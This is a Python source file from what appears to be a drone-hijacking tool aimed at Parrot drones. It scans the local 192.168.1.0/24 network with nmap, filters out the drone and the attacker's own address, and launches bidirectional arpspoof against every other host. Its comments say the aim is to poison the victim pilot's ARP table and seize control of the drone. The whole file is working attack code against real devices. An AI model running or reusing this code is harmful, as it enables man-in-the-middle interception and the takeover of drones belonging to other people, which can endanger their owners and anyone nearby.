import os
import re
import time
from subprocess import Popen,PIPE

from global_vars import *

def scan_ips(local_ip):
	global PARROT_IP
	#print 'PARROT_IP:'+PARROT_IP
	#print'local_ip: '+local_ip
	output=os.popen('nmap -sP 192.168.1.0/24 | awk \'/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}\' | grep -v "'+PARROT_IP+'" | grep -v "'+local_ip+'" | grep -v "DNS"').read()
	ips=output.split("\n")
	for ip in ips:
		if ip!="":
			hijack(ip)
	time.sleep(3)	#small delay to be sure that arp tables are poisoned
	#because if the victim pilot isn't poisoned, we will not have control of the drone (ONLY 1 PILOT X FLY)
def stop_hijack():
	print '[-] stopping hijacking'
	os.popen("killall arpspoof")
	time.sleep(2)	#wait for hosts re-arping

def hijack(ip):
	global PARROT_IP,net_interface
	print '[+] hijacking "'+ip+'"'
	#Bidirectional hijacking
	Popen(['arpspoof', '-i',net_interface,'-t',ip,PARROT_IP], stdout=PIPE, stderr=PIPE)	
	Popen(['arpspoof', '-i',net_interface,'-t',PARROT_IP,ip], stdout=PIPE, stderr=PIPE)